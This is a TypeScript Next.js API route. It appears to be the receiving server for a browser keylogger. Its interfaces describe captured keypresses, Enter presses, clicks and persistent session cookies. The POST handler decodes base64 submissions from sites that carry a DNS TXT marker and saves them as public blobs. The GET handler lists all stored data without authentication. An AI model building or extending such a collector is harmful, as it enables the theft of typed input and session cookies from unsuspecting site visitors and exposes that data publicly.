import { type NextRequest, NextResponse } from 'next/server';
import dns from 'node:dns/promises';
import { put, list, type ListBlobResult } from '@vercel/blob';

export const config = {
  api: {
    externalResolver: true,
  },
};

/**
 * Interface representing a session's metadata.
 */
export interface ISession {
    /** Unique identifier for the session. */
    id:             string;
    /** Timestamp when the session was created. */
    created_at:     Date;
    /** User agent string of the client browser. */
    user_agent:     string;
    /** Persistent session cookie. */
    session_cookie: string;
}

export interface IPayload {
    /** Type of event captured. */
    type:   "keypress" | "enter" | "click";
    /** Value of the captured event. */
    value:  string;
}

export async function GET(_: NextRequest) {
    const response: ListBlobResult = await list();
    return NextResponse.json(
        response,
        { status: 200 }
    );
}

export async function POST(req: NextRequest) {
    try {
        const referer: string | null = req.headers.get("Referer");
        if ( !referer ) {
            return NextResponse.json(
                { message: "Unauthorized" },
                { status: 401 }
            );
        }

        const refererUrl: URL = new URL(referer);
        const domain: string = refererUrl.hostname;

        const txtArray: string[][] = await dns.resolveTxt(domain);
        const txt: string = txtArray.flat().join("");
        if ( !txt.includes("i-love-mihnea-dev") ) {
            return NextResponse.json(
                { message: "Unauthorized" },
                { status: 401 }
            );
        }

        const body: string = await req.text();
        const decoded: string = atob(body);

        await put(domain, decoded, { access: "public" });

        return NextResponse.json(
            { message: "Webhook received" },
            { status: 200 }
        );
    } catch {
        return NextResponse.json(
            { message: "Internal server error" },
            { status: 500 }
        );
    }
}
